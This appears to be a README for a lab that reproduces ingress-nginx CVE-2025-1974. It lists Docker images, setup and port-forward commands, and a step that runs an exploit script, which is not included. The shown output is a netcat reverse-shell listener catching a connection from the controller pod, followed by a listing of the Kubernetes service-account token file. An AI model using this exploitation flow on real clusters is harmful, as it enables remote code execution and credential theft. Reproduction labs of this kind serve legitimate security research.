# ingress-nginx CVE-2025-1974

* dqd:
  * ssst0n3/docker_archive:cve-2025-1974_v0.1.0 -> ssst0n3/docker_archive:ingress-nginx-v1.11.3_v0.1.0
* ctr:
  * ssst0n3/docker_archive:ctr_cve-2025-1974_v0.1.0 -> ssst0n3/docker_archive:ctr_ingress-nginx-v1.11.3_v0.1.0

## usage

```shell
cd vul/CVE-2025-1974
docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
kubectl --kubeconfig=kubeconfig get pods -A
./ssh
```

## reproduce

```shell
kubectl --kubeconfig=kubeconfig port-forward -n ingress-nginx svc/ingress-nginx-controller 8080:80 &
kubectl --kubeconfig=kubeconfig port-forward -n ingress-nginx svc/ingress-nginx-controller-admission 8443:443 &
```

```shell
python3 exploit.py
```

```shell
$ nc -nlvp 2333
listening on [any] 2333 ...
connect to [172.17.0.1] from (UNKNOWN) [172.23.0.2] 52236
ls -lah /var/run/secrets/kubernetes.io/serviceaccount/token
lrwxrwxrwx    1 root     root          12 Mar 29 03:53 /var/run/secrets/kubernetes.io/serviceaccount/token -> ..data/token
```
